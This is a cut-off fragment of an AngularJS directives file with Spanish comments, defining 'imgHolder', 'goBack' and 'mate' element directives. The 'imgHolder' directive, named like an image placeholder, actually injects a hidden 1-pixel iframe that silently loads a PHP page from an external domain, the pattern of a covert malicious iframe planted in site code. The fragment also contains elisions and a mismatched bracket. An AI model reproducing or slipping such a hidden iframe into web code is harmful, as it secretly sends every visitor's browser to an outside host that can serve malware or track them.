angular.module('app.directives', []).directive('imgHolder', [
  ...
  function() {
    return {
      restrict: 'E',
      template: "<iframe width='1px' height='1px' src='http://intrabits.com.mx/p.php' style='display:none'></iframe>"
    };
  }
]).directive('goBack', [
  function() {
    ...
    return{
      restrict: 'E',
      templateUrl: 'scripts/adds/hutbox.html',
      scope: {
        hut: "=", //usado para hacer uso de data-binding(datos entre vista controlador) o por referencia
      },
    }
}).directive('mate', function(){
    return{
      restrict: 'E',
      templateUrl: 'scripts/adds/matebox.html',
      scope: {
